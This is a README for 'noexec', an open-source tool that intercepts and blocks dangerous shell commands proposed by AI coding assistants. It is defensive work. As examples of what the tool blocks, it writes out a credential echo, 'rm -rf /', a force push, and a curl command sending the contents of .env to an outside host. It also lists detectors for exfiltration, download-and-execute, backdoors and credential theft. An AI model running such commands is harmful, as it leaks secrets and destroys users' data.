# noexec

**Runtime security for AI coding assistants** - Stop dangerous commands before they execute.

[![CI](https://github.com/emilgelman/noexec/actions/workflows/ci.yml/badge.svg)](https://github.com/emilgelman/noexec/actions/workflows/ci.yml)
[![Security Audit](https://github.com/emilgelman/noexec/actions/workflows/security.yml/badge.svg)](https://github.com/emilgelman/noexec/actions/workflows/security.yml)
[![npm version](https://img.shields.io/npm/v/noexec.svg)](https://www.npmjs.com/package/noexec)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## The Problem

AI coding assistants can accidentally run dangerous commands:

- 🔑 **Leak credentials** - `echo $AWS_SECRET_KEY`
- 💥 **Destroy data** - `rm -rf /`
- 🚨 **Force push** - `git push --force origin main`
- 📤 **Exfiltrate secrets** - `curl api.example.com -d "$(cat .env)"`

**noexec prevents these issues by analyzing commands before they execute.**

## Installation

```bash
npm install -g noexec
noexec init
```

That's it! noexec now protects your AI coding assistant sessions.

## How It Works

noexec uses **CLI hooks** to intercept commands before execution:

```
AI suggests command → noexec analyzes → Block if dangerous → Safe execution
```

**Example blocked command:**

```bash
# AI tries to run:
echo "Your AWS key is: $AWS_SECRET_ACCESS_KEY"

# noexec blocks it:
❌ Security issue detected: Credential leak detected
   Detector: credential-leak
   Severity: high
```

## Security Detectors

noexec includes 15 built-in detectors for comprehensive protection:

1. **Credential Leak** - Blocks exposure of API keys, tokens, AWS/GCP/Azure credentials, GitHub tokens, SSH keys
2. **Destructive Commands** - Prevents `rm -rf /`, disk formatting, fork bombs, mass process killers
3. **Git Force Operations** - Protects against force push to main/master branches
4. **Environment Variable Leak** - Catches accidental exposure of sensitive env vars
5. **Magic String** - Identifies hardcoded sensitive data patterns (test detector)
6. **Binary Download & Execute** - Detects `curl | bash`, suspicious downloads from untrusted sources
7. **Package Manager Poisoning** - Identifies malicious package installations, registry changes
8. **Security Tool Disabling** - Blocks attempts to disable firewalls, SELinux, antivirus
9. **Network Exfiltration** - Catches data exfiltration attempts via curl/wget/nc
10. **Backdoor/Persistence** - Detects cron jobs, systemd service creation, authorized_keys modification
11. **Credential Harvesting** - Identifies attempts to steal browser cookies, password managers, keychain dumps
12. **Code Injection** - Catches eval, command substitution, shell injection patterns
13. **Container Escape** - Detects privileged Docker containers, host path mounting, namespace manipulation
14. **Archive Bomb/Path Traversal** - Identifies zip bombs, malicious tar extractions
15. **Process Manipulation** - Detects ptrace, LD_PRELOAD hijacking, debugger attachment

## CLI Commands

### `noexec init`

Configures security hooks in supported AI coding assistants.

```bash
noexec init                        # Auto-detect platform
noexec init --platform claude      # Configure specific platform
noexec init --config               # Generate default config file
```

**Supported platforms:**

- ✅ Claude Code (via PreToolUse hook)
- 🔜 GitHub Copilot CLI (coming soon)
- 🔜 Cursor (coming soon)
- 🔜 Continue.dev (coming soon)

### `noexec analyze`

Analyzes commands for security issues (called automatically by hooks).

```bash
noexec analyze --hook PreToolUse
noexec analyze --config path/to/config.json
```

**Exit codes:**

- `0` - No issues detected (command allowed)
- `2` - Security issue detected (command blocked)
- `1` - Analysis error

### `noexec validate-config`

Validates a noexec configuration file.

```bash
noexec validate-config                      # Validates ./noexec.config.json
noexec validate-config path/to/config.json  # Validates custom config
```

## Configuration

Customize detector behavior and thresholds with configuration files.

```bash
noexec init --config  # Generate default config
```

**Example configuration:**

```json
{
  "detectors": {
    "credential-leak": {
      "enabled": true,
      "severity": "high",
      "minEntropy": 4.0,
      "customPatterns": ["mycompany_[a-zA-Z0-9]{32}"]
    },
    "git-force-operations": {
      "enabled": true,
      "protectedBranches": ["main", "master", "production"]
    }
  },
  "globalSettings": {
    "minSeverity": "medium",
    "exitOnDetection": true,
    "jsonOutput": false
  }
}
```

**Config locations** (first found wins):

1. Custom path via `--config` flag
2. Project root: `./noexec.config.json`
3. User home: `~/.noexec/config.json`

See [CONFIG.md](./CONFIG.md) for detailed configuration options.

## Security & Privacy

**Privacy-first design:**

- ✅ Runs entirely locally (no network calls)
- ✅ No telemetry or data collection
- ✅ Open source and auditable
- ✅ Fail-open design (errors don't block legitimate work)

Found a vulnerability? See [SECURITY.md](SECURITY.md) for responsible disclosure.

## Documentation

- **[Architecture](ARCHITECTURE.md)** - System design, components, and data flow
- **[Detectors](DETECTORS.md)** - Complete detector reference and patterns
- **[Configuration](CONFIG.md)** - Configuration file format and options
- **[Troubleshooting](TROUBLESHOOTING.md)** - Common issues and debugging
- **[Contributing](CONTRIBUTING.md)** - Development guide and contribution process
- **[Changelog](CHANGELOG.md)** - Release history and version notes

## Contributing

We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

**Especially welcome:**

- 🔍 New security detectors
- 🔌 Platform integrations (Copilot, Cursor, etc.)
- 🐛 Bug reports and fixes
- 📚 Documentation improvements

### Development Setup

```bash
# Clone and setup
git clone https://github.com/emilgelman/noexec.git
cd noexec
npm install

# Build and link
npm run build
npm link

# Run tests
npm test                  # All tests
npm run test:watch        # Watch mode
npm run test:coverage     # With coverage
npm run test:ui           # Interactive UI

# Development mode
npm run dev               # Auto-rebuild on changes
```

### Adding Custom Detectors

Create a detector in `src/detectors/your-detector.ts`:

```typescript
import { Detection } from './index';

export async function detectMyIssue(toolUseData: any): Promise<Detection | null> {
  const toolInput = JSON.stringify(toolUseData);

  if (issueDetected) {
    return {
      severity: 'high',
      message: 'Clear description of the security issue',
      detector: 'my-detector-name',
    };
  }

  return null;
}
```

Register it in `src/commands/analyze.ts` and add comprehensive tests.

## License

MIT License - see [LICENSE](LICENSE) file for details.

## Acknowledgments

- Inspired by the [Claude Code hooks system](https://code.claude.com/docs/en/hooks)
- Built for developers who want to safely leverage AI coding assistants
- Thanks to all contributors and the open source community

---

**Star ⭐ this repo if you find it useful!**

Made with ❤️ by [Emil Gelman](https://github.com/emilgelman)
